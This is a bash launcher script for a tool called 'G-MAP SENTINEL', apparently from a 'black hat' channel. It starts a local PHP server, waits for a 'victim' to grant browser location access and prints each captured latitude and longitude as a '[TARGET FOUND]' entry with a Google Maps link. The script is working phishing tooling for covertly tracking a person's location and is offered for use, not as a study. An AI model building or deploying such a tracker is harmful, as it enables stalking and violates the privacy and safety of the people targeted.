#!/bin/bash
# G-Map Sentinel by Priyanshu Gupta

R='\e[91m'
G='\e[92m'
Y='\e[93m'
C='\e[96m'
W='\e[97m'

clear
echo -e "${R}  ██████╗ ███╗   ███╗ █████╗ ██████╗ "
echo -e " ██╔════╝ ████╗ ████║██╔══██╗██╔══██╗"
echo -e " ██║  ███╗██╔████╔██║███████║██████╔╝"
echo -e " ██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ "
echo -e " ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     "
echo -e "  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ${W}"
echo -e "------------------------------------------------"
echo -e "${G} [+] Tool: G-MAP SENTINEL (Location Tracker)${W}"
echo -e "${Y} [!] Created by: Priyanshu Gupta ❤️${W}"
echo -e "${C} [>] Subscribe: The Black Hat Priyanshu${W}"
echo -e "------------------------------------------------"

# Kill old sessions
killall php >/dev/null 2>&1
rm -f location.txt
touch location.txt

echo -e "${G}[+] Tracking Server Started on Port 5555...${W}"
php -S 127.0.0.1:5555 >/dev/null 2>&1 &
sleep 2

echo -e "${Y}[*] Link: ${W}http://127.0.0.1:5555"
echo -e "${R}[!] Waiting for victim to click 'Allow'...${W}"
echo ""

# Monitor location.txt
tail -f location.txt | while read line; do
    echo -e "${G}[TARGET FOUND] ${W}$line"
    # Extract Lat and Lon for direct link
    LAT=$(echo $line | cut -d' ' -f2 | tr -d ',')
    LON=$(echo $line | cut -d' ' -f4 | tr -d ',')
    echo -e "${C}[GOOGLE MAPS LINK] ${Y}https://www.google.com/maps?q=$LAT,$LON${W}"
    echo "------------------------------------------------"
done
